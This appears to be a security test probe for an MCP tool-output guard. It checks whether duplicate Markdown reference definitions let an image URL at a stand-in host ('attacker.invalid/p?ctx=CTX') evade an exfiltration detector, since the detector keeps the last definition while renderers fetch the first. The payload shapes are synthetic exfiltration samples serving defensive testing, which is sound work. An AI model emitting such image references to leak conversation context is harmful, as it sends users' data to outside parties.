// T78 — (1) the duplicate reference-definition bypass at all four public
// boundaries; (2) the benign-corpus +2 mechanism, checked rather than accepted.
//
// (1) CommonMark: "If there are several matching definitions, the first one takes
//     precedence." `detectExfil` builds `refs` with `Map.set` per match, so the
//     LAST definition wins, and the finding's masked span is that last URL. A
//     document that defines the same label twice therefore has its SECOND
//     definition masked while a renderer fetches the FIRST.
// Advisory redaction OFF; the mandatory floor is what is measured.
// Read-only, offline, synthetic/reserved hosts only.
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { marked } from "marked";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/safe.png";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const shapes: Record<string, string> = {
  d1ShortcutDupDef: `![a]\n\n[a]: ${U}\n[a]: ${OK}\n`,
  d2FullDupDef: `![a][a]\n\n[a]: ${U}\n[a]: ${OK}\n`,
  d3CollapsedDupDef: `![a][]\n\n[a]: ${U}\n[a]: ${OK}\n`,
  d4DupDefCaseSpelling: `![a]\n\n[A]: ${U}\n[a]: ${OK}\n`,
  d5DupDefWhitespaceSpelling: `![b c]\n\n[b  c]: ${U}\n[b c]: ${OK}\n`,
  d6ThreeDefs: `![a]\n\n[a]: ${U}\n[a]: ${OK}\n[a]: ${OK}\n`,
  // control: single definition, must stay closed
  c1SingleDef: `![a]\n\n[a]: ${U}\n`,
};

const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, text]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: text }),
  })),
};

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}

const rows: Array<Record<string, unknown>> = [];
for (const [name, text] of Object.entries(shapes)) {
  const serialized = JSON.stringify({ note: text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  const imgs = rendererImgSrcs(text);
  rows.push({
    id: name,
    rendererFetches: imgs,
    rendererFetchesAttacker: imgs.some((s) => s.includes(ATT)),
    detectorFindings: detectExfil(text, []).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    mcpLeaksAttacker: JSON.stringify(call).includes(ATT),
    persistLeaksAttacker: persisted.allowed ? persisted.content.includes(ATT) : false,
    transportState: transported.redaction.state,
    transportLeaksAttacker: transported.text.includes(ATT),
    seamLeaksAttacker: seamText.includes(ATT),
  });
}
const leaking = rows.filter(
  (r) =>
    r.rendererFetchesAttacker &&
    (r.mcpLeaksAttacker || r.persistLeaksAttacker || r.transportLeaksAttacker || r.seamLeaksAttacker),
);

// ---------------------------------------------------------------------------
// (2) the corpus +2 mechanism
// ---------------------------------------------------------------------------
const path = ".claude/worktrees/keryx-harness-phase-1-109f34/fixtures/exfil/cases.json";
const fixture = await Bun.file(path).text();
const f = detectExfil(fixture, []);
const detail = f.map((m) => {
  const start = m.start as number;
  const line = fixture.slice(0, start).split("\n").length;
  return {
    policyId: m.policyId,
    line,
    value: String(m.value).slice(0, 70),
    context: fixture.slice(Math.max(0, start - 90), start + 60).replace(/\n/g, "\\n"),
  };
});

console.log(
  JSON.stringify(
    {
      probe: "T78-dup",
      rows,
      leakingAtAnyBoundary: leaking.map((r) => r.id),
      leakingCount: leaking.length,
      corpusFixture: { path, findings: f.length, detail },
    },
    null,
    2,
  ),
);
